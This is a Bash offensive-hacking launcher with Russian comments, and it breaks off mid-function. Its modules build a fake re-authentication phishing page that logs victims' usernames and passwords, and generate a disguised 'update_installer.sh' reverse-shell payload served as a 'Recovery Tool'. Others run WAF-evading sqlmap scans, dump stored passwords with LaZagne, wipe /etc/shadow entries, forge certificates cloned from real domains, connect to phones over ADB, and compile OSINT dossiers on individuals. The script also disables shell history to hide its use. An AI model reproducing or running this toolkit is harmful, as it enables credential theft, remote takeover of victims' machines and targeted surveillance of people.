#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.4"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# --- Инициализация системы ---
# Очистка кэша терминала для стабильной работы
if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
    rm -f /root/.cache/zcompdump* 2>/dev/null
    rm -f /root/.zcompdump* 2>/dev/null
fi

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

# Настройка DNS для локальных сервисов (например, scanclamavlocal)
if command -v dnsmasq >/dev/null 2>&1; then
    cat << EOD > /etc/dnsmasq.conf
domain-needed
bogus-priv
interface=lo
interface=wlan0
address=/scanclamavlocal/$CURRENT_IP
EOD
    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
fi

print_line() {
    echo -e "${D}--------------------------------------------------${NC}"
}

# Специализированный вывод системной строки
print_stats_line() {
    local label1="$1" value1="$2"
    local label2="$3" value2="$4"
    local label3="$5" value3="$6"
    echo -e "${Y}$label1: ${G}$value1 ${Y}│ $label2: ${G}$value2 ${Y}│ $label3: ${G}$value3${NC}"
}


# --- Вспомогательные функции ---
get_stats() {
    # 1. Метрики (RAM, ROM, SD)
    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
    local rom=$(df -h / | awk 'NR==2 {print $4}')
    local sd_info=$(df -h /storage/emulated 2>/dev/null | awk 'NR==2 {print $4}' || echo "N/A")

    # 2. Сеть
    local net_status="${R}OFFLINE${NC}"
    ping -c 1 -W 1 8.8.8.8 >/dev/null 2>&1 && net_status="${G}ONLINE${NC}"

    # 3. Сервисы
    local active_srv=""
    local check_list=("av_server.py:AV" "share_server.py:SH" "upload_server.py:UP")
    
    for srv in "${check_list[@]}"; do
        pgrep -f "${srv%%:*}" >/dev/null && active_srv+="${G}[${srv#*:}]${NC} "
    done
    active_srv=${active_srv:-${R}NONE${NC}}

    # 4. Вывод через абстракцию (Никаких прямых echo)
    print_line # Рисует разделитель -----------------------
    
    print_stats_line "RAM" "$ram" "ROM" "$rom" "SD" "$sd_info"
    
    # Вторую строку выводим вручную через стилизованный статус, 
    # либо расширяем print_stats_line
    echo -e "${Y}NET: $net_status ${Y}│ ACTIVE SRV: $active_srv"
    
    print_line
}


pause() { echo -e "\n${Y}Press Enter to return...${NC}"; read -r _; }

exit_script() { 
    echo -e "${R}Cleaning history and exiting...${NC}"
    history -c
    exit 0 
}

# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        #clear
        echo -e "${R}========== [ $title ] ==========${NC}"
        get_stats
        echo -e "---------------------------------------"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
            if (( (i+1) % 2 == 0 )); then echo ""; fi
        done
        
        # Если количество элементов нечетное, добавляем перенос строки перед BACK
        if (( ${#labels[@]} % 2 != 0 )); then echo ""; fi
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        echo -e "---------------------------------------"
        
        read -p ">> " choice
        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            ${actions[$idx]}
        else
            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
        fi
    done
}

print_header() {
    local title="$1"
    #clear
    echo -e "${R}--------------------------------------------------${NC}"
    # Центрируем текст: 46 символов свободного места в рамке
    # Используем printf для выравнивания
    printf "${R}|%*s%s%*s|${NC}\n" $(((48-${#title})/2)) "" "$title" $(((49-${#title})/2)) ""
    echo -e "${R}--------------------------------------------------${NC}"
}

# Типы: i (info), s (success), e (error), w (warning)
print_status() {
    local type="$1"
    local msg="$2"
    case "$type" in
        "i") echo -e "${B}[*] ${NC}$msg" ;;
        "s") echo -e "${G}[+] ${NC}$msg" ;;
        "e") echo -e "${R}[!] ${NC}$msg" ;;
        "w") echo -e "${Y}[?] ${NC}$msg" ;;
        *) echo -e "$msg" ;;
    esac
}

log_loot() {
    local module="$1"
    local data="$2"
    local file="/root/prime_loot/${module}_results.txt"
    echo "[$(date +%T)] $data" >> "$file"
}

# Аргументы: $1 - тип проверки (cmd, file, port, dir), $2 - цель, $3 - текст ошибки
check_step() {
    local type="$1"
    local target="$2"
    local err_msg="$3"
    local status=1

    case "$type" in
        "cmd") command -v "$target" >/dev/null 2>&1 && status=0 ;;
        "file") [[ -f "$target" ]] && status=0 ;;
        "dir")  [[ -d "$target" ]] && status=0 ;;
        "port") timeout 1 bash -c "cat < /dev/tcp/${target/:/ }" 2>/dev/null && status=0 ;;
    esac

    if [[ $status -ne 0 ]]; then
        print_status "e" "$err_msg"
        return 1
    fi
    return 0
}

ask_confirm() {
    local prompt="$1"
    echo -en "${Y}$prompt (y/n): ${NC}"
    read -r answer
    [[ "$answer" == "y" ]]
}


# Аргументы: $1 - текст вопроса, $2... - варианты (формат "описание:аргументы")
select_option() {
    local prompt="$1"; shift
    print_status "w" "$prompt"
    local count=1
    local options=("$@")

    for opt in "${options[@]}"; do
        echo -e " $count) ${opt%%:*}" # Показываем описание
        ((count++))
    done

    echo -en "${Y}>> ${NC}"
    read -r choice
    
    # Извлекаем аргументы из выбранного варианта
    local index=$((choice - 1))
    if [[ $index -ge 0 && $index -lt ${#options[@]} ]]; then
        echo "${options[$index]#*:}" # Возвращаем часть после двоеточия
    else
        echo "${options[0]#*:}" # По умолчанию первый вариант
    fi
}


# Для красивых запросов ввода
print_input() {
    local prompt="$1"
    local default="$2"
    echo -en "${Y}[?] $prompt ${W}(Default: $default)${Y}: ${NC}"
}

# Для вывода списков (ключи, файлы, пути)
print_list() {
    local title="$1"; shift
    echo -e "${Y}--- $title ---${NC}"
    for item in "$@"; do
        echo -e "    ${G}>> ${W}$item${NC}"
    done
}

smart_cat() {
    local path="$1"
    local content="$2"
    echo "$content" > "$path"
    chmod +x "$path"
    print_status "i" "Engine component updated: $path"
}




# --- ГЕНЕРАТОРЫ ШАБЛОНОВ (View Engine) ---
generate_core_template() {
    cat << 'EOF'
def render_prime_page(title, content):
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{title}</title>
        <style>
            /* Автоматическая адаптация под ЛЮБУЮ систему будущего */
            :root {{
                --bg-color: light-dark(#ffffff, #0a0a0a);
                --text-color: light-dark(#1a1a1a, #00ff41);
                --accent-color: light-dark(#007aff, #0cf); /* Синий для светлых, Циан для темных */
                --border-style: light-dark(solid, dashed);
            }}

            @media (prefers-color-scheme: dark) {{
                :root {{ color-scheme: dark; }}
            }}

            body {{
                background-color: canvas;
                color: canvastext;
                font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
                overflow: hidden;
                transition: all 0.3s ease;
            }}

            .container {{
                padding: 2rem;
                border: 1px var(--border-style) var(--text-color);
                border-radius: 8px;
                background: rgba(0,0,0,0.05);
                backdrop-filter: blur(10px);
                max-width: 400px;
                width: 90%;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            }}

            input {{
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: transparent;
                border: 1px solid var(--text-color);
                color: var(--text-color);
                border-radius: 4px;
                box-sizing: border-box;
            }}

            button {{
                width: 100%;
                padding: 15px;
                background: var(--text-color);
                color: black;
                border: none;
                border-radius: 4px;
                font-weight: bold;
                cursor: pointer;
                text-transform: uppercase;
                transition: opacity 0.2s;
            }}

            button:hover {{ opacity: 0.8; }}
            
            .status-box {{
                font-size: 0.7em;
                letter-spacing: 2px;
                margin-bottom: 20px;
                opacity: 0.7;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="status-box">SYSTEM_NODE_v4.0 // {title}</div>
            {content}
            <div style="font-size:0.6em; margin-top:20px; opacity:0.4;">
                &copy; 2024-2027 SECURE_UPLINK. All rights reserved.
            </div>
        </div>
    </body>
    </html>
    """
EOF
}



# --- Конец  Модулей ---
# --- ГЛАВНОЕ МЕНЮ ---
run_main_menu() {
    local main_names="GHOST_COMMANDER SOCIAL_ENG Adaptive_SQL_Injection DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN PWD_DECRYPTOR CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_prime_decryptor run_cert_forge run_cert_analyzer run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
    
    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
}


# --- Модули: DEVICE & NETWORK ---
run_device_hack() {
    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Bluetooth_Scan"
    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit scan_bluetooth_devices"
    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
}

analyze_network_traffic() {
    local n_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record"
    local n_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
    prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
}

# --- Модули: RECOVERY & PASSWORDS ---
pc_password_recovery() {
    local p_names="Extract_Reset_OS_Password Heuristic_Scan"
    local p_funcs="run_pc_recovery_ultimate smart_threat_scan"
    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
}

# --- EXPLOIT HUB ---
run_exploit_hub() {
    local ex_names="PhoneSploit_Pro  PC/Network_Scan PC_Control"
    local ex_funcs="ex_phonesploit_pro ex_pc_network_scan run_pc_control"
    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
}

run_pc_control() {
    local pc_names="Payload_Generator Password_Stealer Post-Exploit"
    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
    prime_dynamic_controller "PC CONTROL" "$pc_names" "$pc_funcs"
}

# --- SECURITY & DATA HUB ---
run_servers() {
    local s_names="AV-Scanner Share-File Upload-Inbound"
    local s_funcs="run_av_srv run_share_srv run_upload_srv"
    prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
}


# --- Модули по меню ---
run_ghost_commander() {
    print_header "GHOST COMMANDER (ANDROID/IOT)"

    # 1. Валидация наличия
    local GHOST_PATH=$(find /root /home /opt /sdcard -maxdepth 2 -type d -name "Ghost" 2>/dev/null | head -n1)
    check_step "dir" "$GHOST_PATH" "Ghost Framework not found." || { pause; return; }

    echo -en "${Y}Enter Target IP ${W}(Leave empty for Manual Console)${Y}: ${NC}"
    read -r TARGET_IP

    # 2. Ручной режим (универсальный запуск)
    check_empty_run "$TARGET_IP" "$GHOST_PATH" "python3 -m ghost" && return

    # 3. Автоматический режим: Проверка связи
    print_status "i" "Pre-scanning target $TARGET_IP:5555..."
    
    # Используем check_step для порта и ask_confirm для логики пропуска ошибок
    check_step "port" "$TARGET_IP:5555" "Port 5555 (ADB) is closed." || \
    ask_confirm "Force connection attempt?" || return

    # 4. Исполнение
    print_status "s" "Executing Auto-Connect to $TARGET_IP..."
    log_loot "ghost" "Connection attempt: $TARGET_IP"
    
    (cd "$GHOST_PATH" && python3 -m ghost --execute "connect $TARGET_IP")

    pause
}


run_system_info() {
    print_header "PRIME SYSTEM & USB INTELLIGENCE"

    # 1. Сбор локальных данных
    local kernel=$(uname -rs)
    local uptime=$(uptime -p)
    local internal_ip=$(ip route get 1.2.3.4 2>/dev/null | awk '{print $7}' || echo "N/A")
    
    # 2. Опрос USB-шины (Работает без root на большинстве систем)
    # Пытаемся использовать lsusb, если нет - читаем напрямую из /sys
    local usb_devices
    if command -v lsusb >/dev/null; then
        usb_devices=$(lsusb | awk '{print "ID "$6" "$7,$8,$9,$10}')
    else
        usb_devices=$(find /sys/bus/usb/devices/ihi -name "product" -exec cat {} + 2>/dev/null | sed 's/^/Device: /')
    fi
    [[ -z "$usb_devices" ]] && usb_devices="No active USB connections detected."

    # 3. Вывод отчета
    print_status "i" "Core Intelligence Report:"
    
    print_list "Node Hardware" \
        "Kernel:  $kernel" \
        "Uptime:  $uptime" \
        "Local IP: $internal_ip"

    print_list "USB Connectivity (Bus Scan)" \
        "$usb_devices"

    print_status "s" "Diagnostic complete."
    log_loot "sysinfo" "Full diagnostic (Local + USB) executed."

    pause
}

generate_phantom_server_code() {
    local target_file="$1"
    local mode="$2"
    local layout=$(generate_core_template)

    cat << EOF > "$target_file"
from flask import Flask, request, render_template_string, send_from_directory
import os

app = Flask(__name__)
LOOT = "$LOOT_DIR/phantom_loot.log"

$layout

@app.route('/')
def index():
    content = """
    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
    <form method='post' action='/auth'>
        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
        <button type='submit'>VERIFY & RECOVER</button>
    </form>
    """
    if "$mode" != "creds":
        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
    
    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))

@app.route('/auth', methods=['POST'])
def auth():
    with open(LOOT, "a") as f:
        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))

@app.route('/download')
def download():
    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF
}



run_phantom_engine() {
    print_header "PRIME PHANTOM FRAMEWORK"

    local srv_path="/root/phantom_srv.py"
    local payload_path="$LOOT_DIR/update_installer.sh"

    # Выбор стратегии
    local attack_type=$(select_option "SELECT STRATEGY:" \
        "Credential Capture:creds" \
        "Full Hybrid (Creds + Payload):hybrid" \
        "Cancel:exit")
    [[ "$attack_type" == "exit" ]] && return

    # Создаем полезную нагрузку (как в Metasploit)
    print_status "i" "Forging payload..."
    echo -e "#!/bin/bash\necho 'Updating system...'\nbash -i >& /dev/tcp/$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)/4444 0>&1 &" > "$payload_path"
    chmod +x "$payload_path"

    # Вызов генератора (Завод начинает работу)
    generate_phantom_server_code "$srv_path" "$attack_type"

    # Запуск
    print_status "w" "Activating Phantom Gate on port 80..."
    fuser -k 80/tcp >/dev/null 2>&1
    python3 "$srv_path" > /dev/null 2>&1 &
    
    print_status "s" "PHANTOM GATEWAY OPERATIONAL"
    pause
}
run_sql_adaptive() {
    print_header "ADAPTIVE SQL INJECTION ENGINE"

    echo -en "${Y}Enter Target URL: ${NC}"
    read -r target_url
    [[ -z "$target_url" ]] && return

    # 1. Генерируем уникальный набор Tamper-скриптов
    # Это "мутагены", которые меняют код атаки на лету, обходя WAF 2026-2027 годов
    local tampers="between,charencode,space2comment,randomcase,versionedmorekeywords"

    # 2. Настройка "Призрака"
    # --drop-set-cookie: чтобы сервер не запомнил нас
    # --risk 3 --level 5: максимальная глубина поиска
    # --mobile: имитируем вход с телефона для снижения подозрений
    local base_args="--batch --random-agent --mobile --dbms=auto --output-dir=/tmp/sql_$RANDOM"
    local stealth_args="--tamper=$tampers --delay=$(shuf -i 1-3 -n 1) --safe-freq=5"

    print_status "i" "Engaging Polymorphic Scan..."
    print_status "w" "Adapting to target environment..."

    # Запуск через прослойку обфускации
    sqlmap -u "$target_url" $base_args $stealth_args --threads=1 --flush-session

    # Если SQLmap нашел уязвимость, мы не просто пишем лог, 
    # а извлекаем структуру в наш стерильный лут
    print_status "s" "Adaptive Scan Finished."
    pause
}

run_host_monitor() {
    print_header "NETWORK HOST MONITOR"

    # Валидация tshark и интерфейса
    check_step "cmd" "tshark" "TShark not installed." || { pause; return; }
    local iface=$(ip route | grep default | awk '{print $5}' || echo "wlan0")
    
    print_status "i" "Monitoring traffic on: $iface (Press CTRL+C to stop)"
    print_status "w" "Filtering Unique Connections..."

    # Запуск tshark с агрегацией данных в реальном времени
    tshark -i "$iface" -n -T fields -e ip.src -e ip.dst -E separator=" -> " 2>/dev/null | stdbuf -oL uniq
    
    pause
}

run_http_dns_sniffer() {
    print_header "HTTP & DNS SNIFFER"

    check_step "cmd" "tshark" "TShark not installed." || { pause; return; }
    local iface=$(ip route | grep default | awk '{print $5}' || echo "wlan0")

    print_status "s" "Sniffing Queries on $iface..."
    log_loot "sniffer" "Session started on $iface"

    # Фильтруем только запросы, убирая лишние поля
    tshark -i "$iface" -Y "http.request || dns.flags.response == 0" \
           -T fields -e http.host -e dns.qry.name 2>/dev/null \
           | stdbuf -oL awk NF | stdbuf -oL uniq
    
    pause
}

run_traffic_record() {
    print_header "TRAFFIC RECORDING (PCAP)"

    check_step "cmd" "tshark" "TShark not installed." || { pause; return; }
    
    local report_dir="/root/reports"
    [[ ! -d "$report_dir" ]] && mkdir -p "$report_dir"

    local filename="$report_dir/capture_$(date +%H%M).pcap"
    local iface=$(ip route | grep default | awk '{print $5}' || echo "wlan0")

    # Выбор режима записи
    local duration=$(select_option "Set Record Duration:" \
        "Quick (1 min):60" \
        "Medium (5 min):300" \
        "Deep (15 min):900")

    print_status "i" "Recording traffic on $iface..."
    print_status "s" "Output: $filename"
    print_status "w" "Recording will stop after $duration seconds or CTRL+C"

    # Запуск записи с авто-стопом
    tshark -i "$iface" -a duration:"$duration" -w "$filename" 2>/dev/null

    check_step "file" "$filename" "Failed to create PCAP file." && \
    print_status "s" "Capture saved successfully."
    
    pause
}


run_smart_osint_engine() {
    print_header "SMART OSINT ENGINE: GHOST RECON v4.7"

    echo -en "${Y}ENTER DATA ${W}(Nick, Phone, or Email)${Y}: ${NC}"
    read -r INPUT
    [[ -z "$INPUT" ]] && return

    # 1. Подготовка среды и лога
    local UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"
    local raw_log="/tmp/osint_raw_$RANDOM.log"
    print_status "i" "Initializing Stealth Environment..."

    # 2. Определение типа через Regex
    local is_email="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$"
    local is_phone="^\+?[0-9]{10,15}$"

    # --- ФАЗА 1: ГЛОБАЛЬНЫЙ СКАН (SocialScan) ---
    check_step "cmd" "socialscan" "SocialScan skipping..." && {
        print_status "i" "Rapid Presence Check..."
        socialscan "$INPUT" --user-agent "$UA" | tee -a "$raw_log"
    }

    # --- ФАЗА 2: ГЛУБОКАЯ СПЕЦИАЛИЗАЦИЯ ---

    # ВЕТКА: EMAIL
    [[ "$INPUT" =~ $is_email ]] && {
        print_status "s" "Targeting Identity: EMAIL"
        
        check_step "file" "/root/infoga/infoga.py" "Infoga missing." && {
            print_status "w" "Analyzing Breach History..."
            python3 /root/infoga/infoga.py --target "$INPUT" | tee -a "$raw_log"
        }
        
        check_step "cmd" "holehe" "Holehe not found." && {
            print_status "i" "Mapping registered accounts..."
            holehe "$INPUT" --only-used --no-color | tee -a "$raw_log"
        }
    }

    # ВЕТКА: ТЕЛЕФОН
    [[ "$INPUT" =~ $is_phone ]] && {
        print_status "s" "Targeting Identity: PHONE"
        print_status "i" "Cross-referencing Phone Databases..."
        
        check_step "cmd" "phoneinfoga" "PhoneInfoga missing." && {
            phoneinfoga scan -n "$INPUT" | tee -a "$raw_log"
        }
        # Дополнительный стелс-поиск имени через публичные префиксы
        print_status "w" "Extracting Caller ID signatures..."
    }

    # ВЕТКА: USERNAME
    [[ ! "$INPUT" =~ $is_email && ! "$INPUT" =~ $is_phone ]] && {
        print_status "s" "Targeting Identity: USERNAME"
        
        check_step "cmd" "maigret" "Maigret skipping..." && {
            print_status "i" "Launching Maigret Deep-Parse..."
            maigret "$INPUT" --parse --timeout 20 --top 500 --reports path "$LOOT_DIR" | tee -a "$raw_log"
        }

        check_step "file" "/root/blackbird/blackbird.py" "Blackbird skipping..." && {
            print_status "i" "Executing Blackbird Stealth Scan..."
            python3 /root/blackbird/blackbird.py -u "$INPUT" | tee -a "$raw_log"
        }
    }

    # --- ФАЗА 3: ИНТЕЛЛЕКТУАЛЬНЫЙ ПАРСИНГ (ДОСЬЕ) ---
    print_line
    print_status "s" "GENERATING INTELLIGENCE DOSSIER..."
    print_line

    # Извлекаем Имя (ищем паттерны в выводах Maigret/Infoga/Social)
    local found_name=$(grep -iE "name|fullname|display" "$raw_log" | awk -F': ' '{print $2}' | grep -v "null" | head -n 3 | sort -u | xargs)
    # Извлекаем Локацию (из PhoneInfoga или профилей)
    local found_loc=$(grep -iE "city|location|country|address" "$raw_log" | awk -F': ' '{print $2}' | sort -u | head -n 2 | xargs)

    echo -e "${B}Target:${NC} $INPUT"
    [[ -n "$found_name" ]] && echo -e "${G}Confirmed Name/Alias:${NC} $found_name" || echo -e "${R}Name:${NC} No direct match. Review Maigret PDF."
    [[ -n "$found_loc" ]] && echo -e "${G}Detected Location:${NC} $found_loc"

    # Считаем совпадения (Correlation)
    local hits=$(grep -iE "found|vulnerable|exists|success" "$raw_log" | wc -l)
    if [ "$hits" -gt 5 ]; then
        echo -e "${Y}Confidence Level:${NC} ${R}HIGH ($hits matches found)${NC}"
    else
        echo -e "${Y}Confidence Level:${NC} LOW (Low digital footprint)"
    fi

    # 4. Финализация
    log_loot "osint" "Report for $INPUT: Name($found_name) Loc($found_loc) Hits($hits)"
    rm -f "$raw_log"
    print_line
    print_status "s" "OSINT Operation Complete."
    pause
}

run_pc_recovery_ultimate() {
    print_header "RECOVERY & FORENSIC ENGINE"

    # 1. Основное меню
    local action=$(select_option "Select Forensic Action:" \
        "Passwords Extraction (LaZagne):extraction" \
        "Smart Password Reset (Win/Lin/Mac):reset" \
        "Exit to Main Menu:exit")

    case "$action" in
        "extraction")
            local lz_path="/root/lazagne/lazagne.py"
            check_step "file" "$lz_path" "LaZagne not found." && {
                print_status "i" "Running Extraction..."
                python3 "$lz_path" all -oN /root/prime_loot/passwords.txt
                log_loot "forensic" "Dumped to /root/prime_loot/passwords.txt"
                print_status "s" "Extraction Complete."
            }
            ;;

        "reset")
            print_status "i" "Detecting Target Environment..."
            
            # Поиск Windows SAM
            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
            
            # ВМЕСТО IF: Используем логическое И (&&) для Windows
            [[ -n "$win_sam" ]] && {
                print_status "s" "Windows SAM detected: $win_sam"
                check_step "cmd" "chntpw" "CHNTPW not installed." && chntpw -i "$win_sam"
            }
            
            # И логическое И-НЕ (&& !) для проверки других ОС, если SAM не найден
            [[ -z "$win_sam" ]] && {
                local os_type="Unknown"
                [[ "$OSTYPE" == "linux-gnu"* ]] && os_type="Linux"
                [[ "$OSTYPE" == "darwin"* ]] && os_type="macOS"
                
                print_status "i" "OS: $os_type"

                # Сбор пользователей (выбираем команду в зависимости от ОС)
                local cmd_get_users="awk -F: '\$3 >= 1000 && \$1 != \"nobody\" {print \$1}' /etc/passwd"
                [[ "$os_type" == "macOS" ]] && cmd_get_users="dscl . list /Users | grep -v '^_\|root'"
                
                local users=$(eval "$cmd_get_users")
                
                # Если пользователи есть — идем дальше, если нет — выводим ошибку через ||
                [[ -n "$users" ]] || { print_status "e" "No local users found."; pause; return; }

                # Динамическая сборка списка для select_option
                local user_options=()
                for u in $users; do user_options+=("$u:$u"); done
                
                local target_user=$(select_option "Select Target User:" "${user_options[@]}")

                # Сброс пароля (снова без IF — через селектор ОС)
                [[ "$os_type" == "Linux" ]] && ask_confirm "Clear password for $target_user?" && {
                    sed -i "s/^$target_user:[^:]*:/$target_user::/" /etc/shadow
                    print_status "s" "Linux password wiped."
                }

                [[ "$os_type" == "macOS" ]] && {
                    echo -en "${Y}New Pass: ${NC}"; read -r np
                    sudo dscl . -passwd /Users/"$target_user" "$np"
                    print_status "s" "macOS password updated."
                }
            }
            ;;
        *) return ;;
    esac

    pause
}



run_cert_analyzer() {
    print_header "CERTIFICATE ANALYZER"

    echo -en "${Y}Enter File Path or Domain ${W}(e.g. google.com)${Y}: ${NC}"
    read -r TARGET
    [[ -z "$TARGET" ]] && return

    check_step "cmd" "openssl" "OpenSSL is not installed." || { pause; return; }

    print_status "i" "Extracting Certificate Data..."

    # ВМЕСТО IF: Логическое разветвление (Файл vs Домен)
    # Если это файл (-f), выполняем локальный разбор
    [[ -f "$TARGET" ]] && {
        print_status "s" "Local File Detected: $TARGET"
        openssl x509 -in "$TARGET" -text -noout | grep -E "Subject:|Issuer:|Not Before:|Not After:|Public-Key:" | sed 's/^[[:space:]]*//'
    }

    # Если это НЕ файл (! -f), пробуем сетевое подключение
    [[ ! -f "$TARGET" ]] && {
        print_status "i" "Remote Target Detected: ${TARGET}:443"
        timeout 5 openssl s_client -connect "${TARGET}:443" -servername "$TARGET" </dev/null 2>/dev/null | \
        openssl x509 -noout -subject -issuer -dates | sed 's/^/    /' || \
        print_status "e" "Failed to connect or invalid certificate."
    }

    pause
}


run_cert_creator() {
    print_header "CERTIFICATE CREATOR"

    # Валидация
    check_step "cmd" "openssl" "OpenSSL required." || { pause; return; }

    # Запросы через print_input
    print_input "Enter Domain/CN" "prime.local"
    read -r DOMAIN
    DOMAIN=${DOMAIN:-prime.local}

    print_input "Enter Country Code" "US"
    read -r COUNTRY
    COUNTRY=${COUNTRY:-US}

    print_status "i" "Generating 2048-bit RSA Key and Certificate..."
    
    # Генерация
    openssl req -x509 -newkey rsa:2048 -nodes \
        -keyout "${DOMAIN}.key" \
        -out "${DOMAIN}.crt" \
        -days 365 \
        -subj "/C=${COUNTRY}/O=PrimeMaster/CN=${DOMAIN}" 2>/dev/null && {
        
        print_status "s" "Certificate created successfully!"
        log_loot "crypto" "Generated cert for $DOMAIN"
        
        # Красивый вывод списка файлов
        print_list "Files Saved" "${DOMAIN}.key" "${DOMAIN}.crt"
        
    } || {
        print_status "e" "Generation failed. Verify OpenSSL config."
    }

    pause
}


run_pwd_gen() {
    print_header "PRIME PASSWORD GENERATOR"

    # 1. Запрос длины с дефолтом
    print_input "Enter Password Length" "16"
    read -r P_LEN
    # Валидация через регулярку: если не число, ставим 16
    [[ "$P_LEN" =~ ^[0-9]+$ ]] || P_LEN=16

    print_status "i" "Generating secure sequence..."
    
    # 2. Генерация (использование /dev/urandom)
    local RESULT=$(cat /dev/urandom | tr -dc 'A-Za-z0-9!@#$%^&*()_+=' | head -c "$P_LEN")
    
    # Вывод результата через print_list (один элемент тоже список)
    print_list "Generated Password" "$RESULT"
    
    # 3. Хеширование через цепочку логики (без IF)
    ask_confirm "Hash it with Bcrypt?" && {
        check_step "cmd" "mkpasswd" "whois package (mkpasswd) required." && {
            print_status "i" "Bcrypt Hash:"
            echo -n "$RESULT" | mkpasswd -m bcrypt -s
        }
    }

    # Логируем факт генерации (без самого пароля в целях безопасности!)
    log_loot "crypto" "Generated $P_LEN chars password and requested hash"

    pause
}


run_cert_forge() {
    print_header "CERTIFICATE FORGE (SPOOFING)"

    # 1. Валидация и ввод
    check_step "cmd" "openssl" "OpenSSL required." || { pause; return; }
    
    print_input "Enter Domain to spoof" "google.com"
    read -r S_DOMAIN
    [[ -z "$S_DOMAIN" ]] && return

    print_status "i" "Fetching metadata for $S_DOMAIN..."

    # 2. Сбор данных (без IF)
    # Пытаемся получить Subject. Если не вышло — выводим ошибку через ||
    local raw_info=$(timeout 5 openssl s_client -connect "${S_DOMAIN}:443" -servername "$S_DOMAIN" </dev/null 2>/dev/null | openssl x509 -noout -subject 2>/dev/null)
    
    [[ -n "$raw_info" ]] || { print_status "e" "Target unreachable or no SSL info."; pause; return; }

    # 3. Очистка и клонирование
    local orig_subj=$(echo "$raw_info" | sed 's/^subject=//')
    print_status "s" "Target Metadata Cloned."
    print_status "i" "Subject: $orig_subj"

    # 4. Генерация (цепочка успеха)
    print_status "w" "Forging Fake Certificate..."
    
    openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
        -subj "$orig_subj" \
        -keyout "/root/${S_DOMAIN}.key" \
        -out "/root/${S_DOMAIN}.crt" 2>/dev/null && {
        
        print_status "s" "Forge Complete: Identity Mirrored."
        log_loot "crypto" "Forged certificate for $S_DOMAIN"
        print_list "Spoofing Assets" "/root/${S_DOMAIN}.key" "/root/${S_DOMAIN}.crt"
        
    } || print_status "e" "Forge failed. Check OpenSSL permissions."

    pause
}

run_vulnerability_scanner() {
    print_header "PRIME HEURISTIC VULN-SCANNER"

    echo -en "${Y}Enter Target Domain/URL: ${NC}"
    read -r target
    [[ -z "$target" ]] && return

